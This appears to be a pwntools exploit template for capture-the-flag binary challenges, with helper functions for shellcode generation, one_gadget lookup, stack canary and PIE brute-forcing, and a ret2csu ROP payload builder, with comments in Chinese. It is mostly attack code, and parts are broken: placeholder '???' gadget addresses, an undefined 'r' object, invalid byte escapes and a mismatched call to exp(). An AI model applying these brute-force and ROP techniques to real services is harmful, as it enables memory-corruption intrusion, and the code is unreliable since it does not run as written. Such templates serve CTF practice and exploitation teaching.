#coding:utf-8
from pwn import *
from one_gadget import generate_one_gadget
# context.terminal = ["tmux","splitw","-h"]
context.terminal = ["tmux","new-window"]
context.log_level = "debug"

global sh
global elf
global libc

def debug(cmd=""):
    gdb.attach(sh,cmd)
###Shell_code
def shell_code(fw):
    if fw == "32":
        return asm(shellcraft.sh())
    else:
        return asm(shellcraft.amd64.linux.sh())

### One_Gadget
def one_gadget(libc_addr):
    path_to_libc=libc_addr
    gadget =[]
    for offset in generate_one_gadget(path_to_libc):
        gadget.append(int(offset))
    return gadget
#one_gg = one_gadget("/lib/x86_64-linux-gnu/libc.so.6")

### blasting_Canary
def blasting_canary(offset,input_prompt,fw):
    #距离canary的偏移量,输入提示,架构
    sh.recvuntil(input_prompt+'\n')
    canary = '\x00'
    if fw =="32":
        for_num = 3
    else:
        for_num = 7
    for k in range(for_num):
        for i in range(256):
            success("Canary ->"+canary)
            log.info("-------------   No." + str(k) + ":" + chr(i)+"   -------------")
            #gdb.attach(sh)
            sh.send('A'*offset + canary + chr(i))
            recv = sh.recvuntil(input_prompt+"\n")
            if "stack smashing detected" in recv:
                continue
            else:
                canary += chr(i)
                success("Canary =>"+canary)
                break
    return canary
#canary = blasting_canary(0x70-0x8,"Hello,Pwner!"，"64")

### blasting_PIE
def blasting_pie(last_1,last_2_1,tips):
    # 固定的最后1字节，固定的第3位，接收信息提示
    last_2 = ["\x0"+last_2_1,"\x1"+last_2_1,"\x2"+last_2_1,"\x3"+last_2_1,"\x4"+last_2_1,"\x5"+last_2_1,"\x6"+last_2_1,"\x7"+last_2_1,"\x8"+last_2_1,"\x9"+last_2_1,"\xa"+last_2_1,"\xb"+last_2_1,"\xc"+last_2_1,"\xd"+last_2_1,"\xe"+last_2_1,"\xf"+last_2_1]
    vsyscall = 0xffffffffff600000
    for k in range(200):
        log.info("Blow up the end of PIE No."+str(k))
        for i in last_2:
            payload = "A"*(0x70-0x8) + canary
            payload += p64(vsyscall)*k+last_1+i
            try:  
                #gdb.attach(sh)
                sh.send(payload)
                recv = sh.recvline()
                if tips in recv :
                    continue
                else:
                    sh.interactive()
                    break
            except KeyboardInterrupt:
                #当程序卡住不动时，CTRL+C
                sh.interactive()
            except:
                continue
# blasting_pie("\x33","\xa","hello")


### Ret2Csu
def ret2csu(padding, rbx, rbp, r12, r13, r14, r15, sign, ret_addr):
    gadgets1 = ???
    gadgets2 = ???
    payload = padding
    payload+= p64(gadgets1)     #gadget1
    payload += 'b'*8                   
    payload+= p64(rbx)              #rbx
    payload+= p64(rbp)              #rbp
    payload+= p64(r12)              #r12 - 要使用的函数
    if sign == 'asc':       #正序
        payload+= p64(r13)      # rdx - 参数1
        payload+= p64(r14)      # rsi - 参数2
        payload+= p64(r15)       # edi - 参数3
    elif sign == 'desc':    #逆序
        payload+= p64(r15)       # rdi - 参数3
        payload+= p64(r14)      # rsi - 参数2
        payload+= p64(r13)      # rdx - 参数1
    payload+= p64(gadgets2)     #gadget2
    
    payload += 'c' * 0x38        #抬高7*8个字节 
    payload += p64(ret_addr) #及返回地址
    r.sendline(payload)


def exp(bin_elf,pr,libc_addr):
    if pr=="remote":
        sh = remote(bin_elf)
    else:
        sh = process(bin_elf) 
    #sh = remote(bin_elf)
    elf = ELF(bin_elf)
    libc = ELF(libc_addr)




    sh.interactive()
    
if __name__=="__main__":
    exp("","",)
